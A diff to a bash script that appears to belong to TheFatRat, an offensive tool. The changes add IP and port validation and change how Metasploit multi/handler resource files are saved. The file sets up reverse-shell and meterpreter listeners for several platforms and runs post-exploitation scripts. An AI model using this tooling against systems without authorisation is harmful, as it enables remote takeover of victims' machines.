@@ -202,7 +202,7 @@ fi
 
 function invalid ()
 {
-ret=0
+err=0
 echo ""
 if [ -z "$yourip" ]; then 
 echo -e $red ""
@@ -210,23 +210,45 @@ echo "[ ! ] You must write an IP or Hostname ."
 echo -e $okegreen ""
 echo "IP Example : 192.168.1.34
 Domain Example : myhost.com"
-ret=1
+err=1
 fi
 echo ""
 if [ -z "$yourport" ]; then 
 echo -e $red ""
 echo "[ ! ] You must write a port number between 1 & 65535 ."
-ret=1
+err=1
 fi
 if [ -z "$fira" ]; then 
 echo -e $red ""
 echo "[ ! ] You must write a filename ."
 echo -e $okegreen ""
 echo "Filename Example : myfile"
-ret=1
+err=1
 fi
 echo -e $okegreen ""
 }
+
+function invalid1 ()
+{
+err=0
+echo ""
+if [ -z "$yourip" ]; then 
+echo -e $red ""
+echo "[ ! ] You must write an IP or Hostname ."
+echo -e $okegreen ""
+echo "IP Example : 192.168.1.34
+Domain Example : myhost.com"
+err=1
+fi
+echo ""
+if [ -z "$yourport" ]; then 
+echo -e $red ""
+echo "[ ! ] You must write a port number between 1 & 65535 ."
+err=1
+fi
+echo -e $okegreen ""
+}
+
 
 valid_ip()
 {
@@ -775,7 +797,7 @@ fi
                                 fi
                                 read -p '  Please enter the base name for output files : ' fira
 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -816,7 +838,7 @@ fi
                                 
                                 read -p '  Please enter the base name for output files : ' fira
 				invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -856,7 +878,7 @@ fi
 
                                 read -p '  Please enter the base name for output files : ' fira
                                invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -956,7 +978,7 @@ fi
                                 
                                 read -p '  Please enter the base name for output files : ' fira
                                 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -996,7 +1018,7 @@ fi
                                 
                                 read -p '  Please enter the base name for output files : ' fira
                                 invalid				
-if [ $ret == "1" ]
+if [ $err == "1" ]
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -1037,7 +1059,7 @@ fi
                                 
                                 read -p '  Please enter the base name for output files : ' fira
                                 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -1078,7 +1100,7 @@ fi
 
                                 read -p '  Please enter the base name for output files : ' fira
 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -1119,7 +1141,7 @@ fi
 
                                 read -p '  Please enter the base name for output files : ' fira
 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -1160,7 +1182,7 @@ fi
 
                                 read -p '  Please enter the base name for output files : ' fira
 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -1199,7 +1221,7 @@ fi
                                 fi
                                 read -p '  Please enter the base name for output files : ' fira
 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -1238,7 +1260,7 @@ fi
                                 fi
                                 read -p '  Please enter the base name for output files : ' fira
 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -1280,7 +1302,7 @@ fi
 					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
 					read fira
 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -1328,7 +1350,7 @@ fi
   					echo -ne $okegreen " Please enter the base name for output files ex: test.zip / test.rar):" ;tput sgr0
   					read fira
 invalid				
-if [ $ret == "1" ] 
+if [ $err == "1" ] 
 then
 echo -e $okegreen ""
 echo -n "Press any key to return to menu ."
@@ -1423,27 +1445,38 @@ yourip=""
 yourport=""
 fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' uservar
-           	 		echo set LHOST $uservar >> "temp/meterpreter_linux.rc"
-           	 		read -p '  Set LPORT: ' uservar
-           	 		echo set LPORT $uservar >> "temp/meterpreter_linux.rc"
+				read -p '  Set LHOST IP: ' yourip
+           	 		read -p '  Set LPORT: ' yourport
+invalid1				
+if [ $err == "1" ] 
+then
+echo -e $okegreen ""
+echo -n "Press any key to return to menu ."
+read inp
+clisteners
+fi
+                                echo set LHOST $yourip >> "temp/meterpreter_linux.rc"
+           	 		echo set LPORT $yourport >> "temp/meterpreter_linux.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_linux.rc"
            	 		echo exploit -j  >> "temp/meterpreter_linux.rc"
                                 zenity --question --text="Do you want to save this configuration to use in future ?"
                                 if [ $? = 0 ] ; then
                                 save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="linux-config");
                                 cp $path/temp/meterpreter_linux.rc $list/$save.rc >/dev/null 2>&1
-                                echo -e okegreen "Configuration file saved to $list/$save.rc"
-                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_linux.rc"
-                                clear
-                                else
-                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_linux.rc"
-                                clear
-                                fi
-
+                                echo -e $okegreen ""
+echo "Configuration file saved to $list/$save.rc "
+echo ""
+echo -e $yellow ""
+echo "To load this configuration press on this menu 5 and select $save.rc"
+fi 
+echo ""
+echo -e $okegreen ""
+echo -ne $okegreen"  Press any key to continue ......... "
+read continue     
+clisteners 
+                     
 			elif test $fatrat1 == '2' #Windows
 				then
-				rm temp/*.rc > /dev/null 2>&1
 				touch "temp/meterpreter_windows.rc"
            	 		echo use exploit/multi/handler >> "temp/meterpreter_windows.rc"
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/powershell_bind_tcp" FALSE "windows/powershell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
@@ -1459,10 +1492,18 @@ yourip=""
 yourport=""
 fi
 				echo -e $okegreen""
-           	 		read -p '  Set LHOST IP: ' uservar
-           	 		echo set LHOST $uservar >> "temp/meterpreter_windows.rc"
-           	 		read -p '  Set LPORT: ' uservar
-           	 		echo set LPORT $uservar >> "temp/meterpreter_windows.rc"
+           	 		read -p '  Set LHOST IP: ' yourip
+           	 		read -p '  Set LPORT: ' yourport
+invalid1				
+if [ $err == "1" ] 
+then
+echo -e $okegreen ""
+echo -n "Press any key to return to menu ."
+read inp
+clisteners
+fi
+                                echo set LHOST $yourip >> "temp/meterpreter_windows.rc"
+           	 		echo set LPORT $yourport >> "temp/meterpreter_windows.rc"
 				echo set AutoRunScript multi_console_command -rc $path/postexploit/$pe >> "temp/meterpreter_windows.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_windows.rc"
            	 		echo exploit -j  >> "temp/meterpreter_windows.rc"
@@ -1470,13 +1511,17 @@ fi
                                 if [ $? = 0 ] ; then
                                 save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="windows-config");
                                 cp $path/temp/meterpreter_windows.rc $list/$save.rc >/dev/null 2>&1
-                                echo -e okegreen "Configuration file saved to $list/$save.rc"
-                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_windows.rc"
-                                clear
-                                else
-                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_windows.rc"
-                                clear
-                                fi
+                                echo -e okegreen ""
+                                echo "Configuration file saved to $list/$save.rc "
+echo ""
+echo -e $yellow ""
+echo "To load this configuration press on this menu 5 and select $save.rc"
+fi
+echo ""
+echo -e $okegreen ""
+echo -ne $okegreen"  Press any key to continue ......... "
+read continue     
+clisteners 
 
 			elif test $fatrat1 == '3'  #Mac
 				then
@@ -1494,23 +1539,35 @@ yourip=""
 yourport=""
 fi
 				echo -e $okegreen""
-           	 		read -p '  Set LHOST IP: ' uservar
-           	 		echo set LHOST $uservar >> "temp/meterpreter_mac.rc"
-           	 		read -p '  Set LPORT: ' uservar
-           	 		echo set LPORT $uservar >> "temp/meterpreter_mac.rc"
+           	 		read -p '  Set LHOST IP: ' yourip
+           	 		read -p '  Set LPORT: ' yourport
+invalid1				
+if [ $err == "1" ] 
+then
+echo -e $okegreen ""
+echo -n "Press any key to return to menu ."
+read inp
+clisteners
+fi
+                                echo set LHOST $yourip >> "temp/meterpreter_mac.rc"
+           	 		echo set LPORT $yourport >> "temp/meterpreter_mac.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_mac.rc"
            	 		echo exploit -j  >> "temp/meterpreter_mac.rc"
                                 zenity --question --text="Do you want to save this configuration to use in future ?"
                                 if [ $? = 0 ] ; then
                                 save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="mac-config");
                                 cp $path/temp/meterpreter_mac.rc $list/$save.rc >/dev/null 2>&1
-                                echo -e okegreen "Configuration file saved to $list/$save.rc"
-                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_mac.rc"
-                                clear
-                                else
-                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_mac.rc"
-                                clear
-                                fi
+                                 echo -e okegreen ""
+                                echo "Configuration file saved to $list/$save.rc "
+echo ""
+echo -e $yellow ""
+echo "To load this configuration press on this menu 5 and select $save.rc"
+fi
+echo ""
+echo -e $okegreen ""
+echo -ne $okegreen"  Press any key to continue ......... "
+read continue     
+clisteners 
 
 			elif test $fatrat1 == '4' #Android
 				then
@@ -1529,23 +1586,35 @@ yourip=""
 yourport=""
 fi
 				echo -e $okegreen""
-           	 		read -p '  Set LHOST IP: ' uservar
-           	 		echo set LHOST $uservar >> "temp/meterpreter_android.rc"
-           	 		read -p '  Set LPORT: ' uservar
-           	 		echo set LPORT $uservar >> "temp/meterpreter_android.rc"
+           	 		read -p '  Set LHOST IP: ' yourip
+           	 		read -p '  Set LPORT: ' yourport
+invalid1				
+if [ $err == "1" ] 
+then
+echo -e $okegreen ""
+echo -n "Press any key to return to menu ."
+read inp
+clisteners
+fi
+                                echo set LHOST $yourip >> "temp/meterpreter_android.rc"
+           	 		echo set LPORT $yourport >> "temp/meterpreter_android.rc"
            	 		echo set ExitOnSession false >> "temp/meterpreter_android.rc"
            	 		echo exploit -j  >> "temp/meterpreter_android.rc"
                                 zenity --question --text="Do you want to save this configuration to use in future ?"
                                 if [ $? = 0 ] ; then
                                 save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="android-config");
                                 cp $path/temp/meterpreter_android.rc $list/$save.rc >/dev/null 2>&1
-                                echo -e okegreen "Configuration file saved to $list/$save.rc"
-                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_android.rc"
-                                clear
-                                else
-                                xterm -fa monaco -fs 13 -bg black -e $msfconsole -r "temp/meterpreter_android.rc"
-                                clear
-                                fi
+                                 echo -e okegreen ""
+                                echo "Configuration file saved to $list/$save.rc "
+echo ""
+echo -e $yellow ""
+echo "To load this configuration press on this menu 5 and select $save.rc"
+fi
+echo ""
+echo -e $okegreen ""
+echo -ne $okegreen"  Press any key to continue ......... "
+read continue     
+clisteners 
 
                               elif test $fatrat1 == '5'
                               then
@@ -1567,7 +1636,7 @@ fi
 	 	else
 			echo -e "  Incorrect Number"
 			fi
-			echo -n -e "  Do you want exit? ( Yes / No ) : "
+			echo -n -e "  Do you want exit Fatrat ? ( Yes / No ) : "
 		read back
 			if [ $back != 'n' ] && [ $back != 'N' ]
 					then
